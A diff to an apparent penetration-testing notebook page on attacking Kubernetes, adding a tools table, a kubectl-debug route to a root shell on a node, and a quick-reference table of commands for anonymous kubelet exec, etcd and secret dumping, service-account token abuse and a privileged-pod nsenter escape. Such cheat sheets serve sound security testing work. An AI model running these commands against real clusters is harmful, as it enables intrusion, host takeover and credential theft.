@@ -1,7 +1,28 @@
 # Kubernetes
 
-## What is it?
+#Kubernetes #k8s #containers #cloud #orchestration #RBAC
+
+## What is Kubernetes?
+
 Kubernetes (k8s) is a container orchestration platform. Attack surface includes unauthenticated API endpoints, misconfigured RBAC, exposed dashboards, kubelet exec, etcd secrets dump, container escape, and cloud metadata abuse from within pods.
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Cloud/kubectl\|kubectl]] | Standard API-server client — enumerate pods/secrets/RBAC, check effective perms, create privileged pods |
+| [[Tools/Cloud/kubeletctl\|kubeletctl]] | Kubelet API (10250) client — list pods and exec on nodes without API-server creds; `scan rce`/`scan token` |
+| [[Tools/Cloud/peirates\|peirates]] | Interactive in-pod escalation — SA-token/secret dump, cloud-metadata creds, escape attempts |
+| [[Tools/Cloud/kube-hunter\|kube-hunter]] | Cluster vulnerability scanner (remote / in-pod) — **archived 2024**, first-pass only |
+| [[Tools/Cloud/kubeaudit\|kubeaudit]] | Config auditor — privileged containers, capabilities, hostPath, automount; maps to Dangerous Settings |
+| [[Tools/Scanning/trivy\|Trivy]] | Image/IaC/cluster CVE + secret scanner |
+| [[Tools/Recon/trufflehog\|TruffleHog]] | Secret scanner with live key verification — pipe ConfigMaps/Secrets through it |
+| [[Tools/Recon/gitleaks\|gitleaks]] | Git-history secret scanner for a target's repos/manifests |
+| [[Tools/Scanning/NMAP\|Nmap]] | Identify k8s ports (6443/10250/10255/2379/8443) + versions |
+| [[Tools/File Transfer/cURL\|cURL]] | Raw API/kubelet/etcd/metadata interaction |
+| [[Tools/Cloud/aws-cli\|aws-cli]] | Use IMDS-stolen IAM role creds after a pod → cloud-metadata pivot |
 
 ---
 
@@ -298,6 +319,19 @@ kubectl get pods -A --as=system:admin
 kubectl get secrets -A --as=system:admin
 ```
 
+> [!note] **Pod Security Admission (PSA) gates the privileged-pod escape.** PodSecurityPolicy was removed in **Kubernetes 1.25**; modern clusters enforce the built-in **Pod Security Admission** instead, labelled per-namespace (`pod-security.kubernetes.io/enforce: baseline|restricted`). A `restricted` or `baseline` namespace will *reject* the `privileged`/`hostPID`/`hostPath` pod above. Check the target namespace's labels (`kubectl get ns <ns> --show-labels`) and look for a namespace with no PSA label or `enforce: privileged` — that's where the escape pod will actually schedule.
+
+### `kubectl debug` — Node Access via Debug Pod
+
+If you can't create an arbitrary privileged pod but hold `pods/exec` and node-debug rights, `kubectl debug` on a **node** schedules a debug pod in the host namespaces with the host filesystem at `/host` — a supported, quieter route to node access than a hand-rolled privileged pod.
+
+```bash
+# Drop a root shell onto a node with the host FS mounted at /host
+kubectl debug node/<node-name> -it --image=busybox -- chroot /host bash
+# Ephemeral-container variant: attach a debug container to a running pod (needs pods/ephemeralcontainers)
+kubectl debug -it <pod> --image=busybox --target=<container> --profile=sysadmin -- sh
+```
+
 ---
 
 ## Container Escape — Privileged Container
@@ -432,42 +466,6 @@ aws ec2 describe-instances
 
 ---
 
-## Tools
-
-```bash
-# kubectl (standard)
-apt install kubectl
-
-# kubeletctl — kubelet API interaction tool
-# https://github.com/cyberark/kubeletctl
-kubeletctl pods -s <target>
-kubeletctl exec "id" -p <pod> -c <container> -s <target>
-kubeletctl scan rce -s <target>   # scan all pods for RCE via kubelet
-kubeletctl scan token -s <target> # scan all pods for SA tokens
-
-# kube-hunter — passive and active cluster scanning
-pip install kube-hunter
-kube-hunter --remote <target>      # remote scan
-kube-hunter --pod                  # run from inside a pod
-kube-hunter --remote <target> --active  # active exploitation attempts
-
-# peirates — Kubernetes pentest tool
-# https://github.com/inguardians/peirates
-peirates   # interactive menu for pod SA token abuse, secret dump, escape
-
-# kubeaudit — audit cluster for misconfigs
-# https://github.com/Shopify/kubeaudit
-kubeaudit all -f kubeconfig.yaml
-
-# truffleHog / gitleaks — scan configmaps/secrets for embedded credentials
-kubectl get configmap -A -o json | trufflehog filesystem /dev/stdin
-
-# Trivy — scan images for CVEs
-trivy image <image:tag>
-```
-
----
-
 ## Kubeconfig File Locations & Extraction
 
 ```bash
@@ -500,7 +498,7 @@ find / -name "*.conf" -path "*/kubernetes/*" 2>/dev/null
 
 ---
 
-## Dangerous Configurations
+## Dangerous Settings
 
 | Config | Risk |
 |--------|------|
@@ -521,33 +519,19 @@ find / -name "*.conf" -path "*/kubernetes/*" 2>/dev/null
 
 ## Quick Reference
 
-```bash
-# API server anonymous access check
-curl -sk https://<target>:6443/api/v1/namespaces
-
-# kubelet read-only pods list
-curl http://<target>:10255/pods | jq '.items[].metadata.name'
-
-# kubelet exec (anon)
-curl -sk https://<target>:10250/run/default/<pod>/<container> -X POST -d "cmd=id"
-
-# etcd dump
-ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
-
-# dump all secrets from API
-kubectl get secrets -A -o json | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, data:.data}'
-
-# from inside pod — SA token + API query
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -sk https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $TOKEN"
-
-# privileged pod escape — host filesystem
-kubectl run escape --image=ubuntu --restart=Never --privileged \
-  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"ubuntu","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'
-
-# kubeletctl scan
-kubeletctl scan rce -s <target>
-```
+| Goal | Command |
+|---|---|
+| API anon access check | `curl -sk https://host:6443/api/v1/namespaces` |
+| Kubelet read-only pods | `curl http://host:10255/pods \| jq '.items[].metadata.name'` |
+| Kubelet exec (anon) | `curl -sk https://host:10250/run/default/<pod>/<container> -X POST -d "cmd=id"` |
+| etcd dump | `ETCDCTL_API=3 etcdctl --endpoints=http://host:2379 get / --prefix --keys-only` |
+| Dump all secrets (API) | `kubectl get secrets -A -o json \| jq '.items[]\|{ns:.metadata.namespace,name:.metadata.name,data:.data}'` |
+| In-pod SA token query | `TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $TOKEN"` |
+| Check my permissions | `kubectl auth can-i --list` / `kubectl auth can-i '*' '*' --all-namespaces` |
+| Node access (debug) | `kubectl debug node/<node> -it --image=busybox -- chroot /host bash` |
+| Privileged-pod escape | `kubectl run escape --image=ubuntu --restart=Never --privileged --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"ubuntu","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'` |
+| Kubelet RCE scan | `kubeletctl scan rce -s host` |
+| Steal SA/cloud creds in-pod | `peirates` (interactive) |
 
 ---
 
@@ -556,5 +540,5 @@ kubeletctl scan rce -s <target>
 ---
 
 *Created: 2026-07-13*
-*Updated: 2026-08-28*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
